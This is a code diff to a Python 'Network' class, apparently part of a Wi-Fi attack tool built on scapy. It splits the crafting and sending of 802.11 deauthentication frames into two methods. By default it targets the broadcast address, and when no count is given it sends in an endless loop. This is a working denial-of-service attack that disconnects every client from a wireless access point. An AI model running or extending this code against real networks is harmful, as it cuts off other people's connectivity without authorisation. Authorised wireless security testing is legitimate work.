@@ -2,6 +2,8 @@ from __future__ import annotations
 
 from typing import TYPE_CHECKING
 
+from scapy.packet import Packet
+
 if TYPE_CHECKING:
     # imports that are only used for typechecking
     from objects.interfaces import Interface
@@ -36,6 +38,9 @@ class Network:
     def get_channel(self) -> str:
         return self._channel
 
+    def get_deauth_packet(self) -> Packet:
+        return self._deauth_packet
+
     def get_crypto(self) -> set:
         return self._crypto
     
@@ -45,15 +50,10 @@ class Network:
     def set_ssid(self, ssid: str) -> None:
         self._ssid = ssid
     
-    def deauth(
+    def craft_deauth_packet(
         self,
-        interface: Interface,
         target_mac: str = 'ff:ff:ff:ff:ff:ff',
-        interval: float = .1,
-        count: int = 0,
-        verbose: bool = True,
     ) -> None:
-
         bssid = self.get_bssid()
 
         # 802.11 frame
@@ -63,10 +63,19 @@ class Network:
             addr3 = bssid, # Access Point MAC
         )
         # stack them up
-        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+        self._deauth_packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+    
+    def deauth(
+        self,
+        interface: Interface,
+        interval: float = .1,
+        count: int = 0,
+        verbose: bool = True,
+    ) -> None:
+
         # send the packet
         sendp(
-            x = packet,
+            x = self.get_deauth_packet(),
             inter = interval,
             count = count,
             loop = not count,
